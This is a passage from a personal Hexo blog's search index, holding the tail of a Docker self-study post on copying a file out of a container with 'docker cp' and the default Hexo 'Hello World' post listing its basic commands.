test.py</span><br>[root@3ab96e4a355c home]<span class="hljs-comment"># exit</span><br><span class="hljs-built_in">exit</span><br>[root@kai kai]<span class="hljs-comment"># docker ps -a</span><br>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES<br>3ab96e4a355c        centos              <span class="hljs-string">&quot;/bin/bash&quot;</span>         40 seconds ago      Exited (0) 6 seconds ago                        vibrant_mclean<br><br><span class="hljs-comment">#复制，使用复制命令时，不用关心容器是否开启</span><br>[root@kai kai]<span class="hljs-comment"># docker cp 3ab96e4a355c:/home/test.py ./</span><br>[root@kai kai]<span class="hljs-comment"># ls</span><br>Desktop    Downloads  Pictures  Templates  testcp.txt  Videos<br>Documents  Music      Public    test1.txt  test.py<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>self study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>just a little</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/09/16/hello-world/"/>
    <url>/2021/09/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
